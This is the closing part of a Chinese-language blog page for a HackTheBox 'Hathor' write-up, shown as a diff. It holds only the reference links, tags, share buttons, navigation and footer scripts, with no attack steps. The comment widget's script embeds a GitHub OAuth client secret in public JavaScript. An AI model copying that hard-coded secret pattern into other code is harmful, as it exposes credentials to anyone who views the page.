+<li>HTB: Hathor | 0xdf hacks stuff<br><a href="https://0xdf.gitlab.io/2022/11/19/htb-hathor.html" target="_blank" rel="noopener">https://0xdf.gitlab.io/2022/11/19/htb-hathor.html</a></li>
+<li>HackTheBox - Hathor - YouTube<br><a href="https://www.youtube.com/watch?v=yweDaXZdt4s&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=yweDaXZdt4s&amp;ab_channel=IppSec</a></li>
+</ul>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2022-11-21T06:15:25.883Z" itemprop="dateUpdated">2022-11-21 14:15:25</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/&title=《Hathor - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/&title=《Hathor - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Hathor - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/04/21/Phoenix-HackTheBox/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Phoenix - HackTheBox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/04/08/Catch-HackTheBox/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Catch - HackTheBox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2022</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/&title=《Hathor - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/&title=《Hathor - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Hathor - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2022/04/16/Hathor-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMUlEQVR42u3aS27DMAxF0ex/0+q0RWr1PtINYOpqFAR2rOMBI35eL7zW2/r+/f769yv3v3b1mzcsGTJkPJaxtmv/4D1mD9s/ne9NhgwZ5zCuHrz/zLe7v56E6T/2LEOGDBlhECQHPvKaZMiQIaMfcPnBrnO9DBkyZKQBlGyRHARrhbkbcnEZMmQ8kFFLNT/z+V/6GzJkyHgUY4WLF/TToLwaS4YMGbMZtQYkTzvJdkmLFLUfZMiQcQCDP7IzJMGLdyT1LU5zyJAh41EMXlxLS2O1Qj9vc/74RoYMGQcw0mDHg3Lt2EfaDL/k4jJkyBjKSANlv6lJNlcLzTJkyJjNSIchOsc+PkiRjnHIkCFjNqOzlf3v9FubwUuXIUPGUEY69JCmtfz61t+ADBkyDmCkJbBO6Y2H11ahTYYMGYMYtc31ByzIgTJOrWXIkHEAo5ZS8vEIwubgy1xchgwZQxk8BeVl/dsS1NqSIUPGIEYaLtMjHQ/oaetUhgwZ5zBqIbhW4+IBvT9WK0OGjHkMbk1LbKS41g/KMmTIOIfBGwC8YdkZ9ooDvQwZMo5hpAlt7eyZhml0lwwZMoYyVrjSsj4P2STgXr4+GTJkjGZ0jmu1Un5tUCxtRciQIWMeIx2bIFeS8a+P5uIyZMgYweCBL21GpvcSJOpvyJAh42BGf8CLNzuDu2TIkCGjlHzeVUpDJBkyZBzA4Kkp3y4P0LWGhAwZMs5hpKkj32hnE/wlypAhYzTjC5ROslCloe1KAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
